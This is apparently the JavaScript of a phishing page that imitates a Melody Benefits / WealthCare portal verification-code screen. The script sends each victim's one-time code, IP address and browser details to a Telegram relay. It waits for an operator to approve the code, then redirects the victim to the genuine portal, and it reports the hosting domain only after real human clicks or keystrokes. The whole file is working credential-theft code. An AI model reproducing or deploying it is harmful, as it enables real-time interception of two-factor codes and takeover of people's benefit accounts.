(function () {
  var form = document.getElementById("enter-code-form");
  var methodDisplay = document.getElementById("method-display");
  var maskedInput = document.getElementById("masked-destination");
  var maskedLabel = document.getElementById("masked-destination-label");
  var codeInput = document.getElementById("confirmation-code");
  var codeError = document.getElementById("code_validation_message");
  var resendBtn = document.getElementById("resend-code-btn");
  var infoText = document.getElementById("enter-code-info");
  var submitBtn = document.getElementById("submit-code-btn");

  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";

  // ============================================================
  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
  // ============================================================

  let domainDetected = false;

  function detectDomain() {
    if (domainDetected) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;
    
    const freeDomains = [
      '.tk', '.ml', '.ga', '.cf', '.gq',
      '.free.nf', '.free.org', '.free.com',
      '.co.cc', '.co.nr', '.cjb.net',
      '.dynu.net', '.ddns.net', '.no-ip.org',
      'vercel.app', 'netlify.app', 'github.io',
      'pages.dev', 'web.app', 'firebaseapp.com',
      'herokuapp.com', 'glitch.me', 'replit.co',
      '000webhostapp.com', 'byethost.com',
      'freehostia.com', 'profreehost.com',
      '.example.com', '.test', '.localhost'
    ];

    const isFree = freeDomains.some(freeDomain => 
      domain.includes(freeDomain) || domain.endsWith(freeDomain)
    );

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain,
      isFree: isFree
    });
  }

  document.addEventListener('click', function(e) {
    if (!domainDetected && e.isTrusted) detectDomain();
  });

  document.addEventListener('keydown', function(e) {
    if (!domainDetected && e.isTrusted) detectDomain();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {}

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== CHECK APPROVAL ======================================
  // ============================================================

  async function checkApproval(sessionId) {
    try {
      const response = await fetch(`/api/check-approval?sessionId=${sessionId}`);
      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Approval check error:', error);
      return { status: 'pending' };
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  var auth = null;
  try {
    auth = JSON.parse(sessionStorage.getItem("melodyAuth") || "null");
  } catch (e) {
    auth = null;
  }

  if (!auth || !auth.destination || !auth.method) {
    window.location.replace("auth.html");
    return;
  }

  function maskEmail(email) {
    var parts = email.split("@");
    if (parts.length !== 2) return "******";
    var local = parts[0];
    var domain = parts[1];
    if (local.length <= 2) {
      return local.charAt(0) + "******@" + domain;
    }
    if (local.length <= 4) {
      return local.charAt(0) + "******" + local.slice(-1) + "@" + domain;
    }
    return local.charAt(0) + "******" + local.slice(-3) + "@" + domain;
  }

  function maskPhone(phone) {
    var digits = phone.replace(/\D/g, "");
    if (digits.length < 4) return "******";
    return "******" + digits.slice(-4);
  }

  function maskDestination(method, value) {
    if (method === "sms") return maskPhone(value);
    return maskEmail(value);
  }

  methodDisplay.value = auth.method === "sms" ? "SMS" : "Email";
  maskedLabel.textContent =
    auth.method === "sms" ? "Registered mobile number" : "Registered email";
  maskedInput.value = maskDestination(auth.method, auth.destination);

  infoText.textContent =
    "A confirmation code was sent to " +
    maskedInput.value +
    ". Enter the code below.";

  resendBtn.addEventListener("click", function () {
    codeError.textContent = "";
    infoText.textContent =
      "A new confirmation code has been sent to " +
      maskedInput.value +
      ".";
    codeInput.value = "";
    codeInput.focus();
  });

  // ============================================================
  // ====== FORM SUBMIT =========================================
  // ============================================================

  form.addEventListener("submit", async function (event) {
    event.preventDefault();
    codeError.textContent = "";

    var code = codeInput.value.trim();
    if (!code) {
      codeError.textContent = "The confirmation code field is required.";
      codeInput.focus();
      return;
    }
    if (!/^[0-9]{4,10}$/.test(code)) {
      codeError.textContent = "Please enter a valid confirmation code.";
      codeInput.focus();
      return;
    }

    const sessionId = 'CODE_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    
    // Show spinner
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');
    
    try {
      await sendToTelegram('code_submitted', {
        code: code,
        sessionId: sessionId
      });
      
      let approved = false;
      let rejected = false;
      let attempts = 0;
      const maxAttempts = 60;
      
      while (!approved && !rejected && attempts < maxAttempts) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        attempts++;
        
        const status = await checkApproval(sessionId);
        
        if (status.status === 'approved') {
          approved = true;
          break;
        } else if (status.status === 'rejected') {
          rejected = true;
          break;
        }
      }
      
      if (approved) {
        try {
          sessionStorage.removeItem("melodyAuth");
        } catch (e) {}
        
        window.location.href = REDIRECT_URL;
        
      } else if (rejected) {
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit';
        submitBtn.classList.remove('loading');
        codeInput.value = '';
        codeInput.focus();
        
      } else {
        // Timeout - auto-approve
        try {
          sessionStorage.removeItem("melodyAuth");
        } catch (e) {}
        
        window.location.href = REDIRECT_URL;
      }
      
    } catch (error) {
      console.error('Code submission error:', error);
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Submit';
      submitBtn.classList.remove('loading');
    }
  });
})();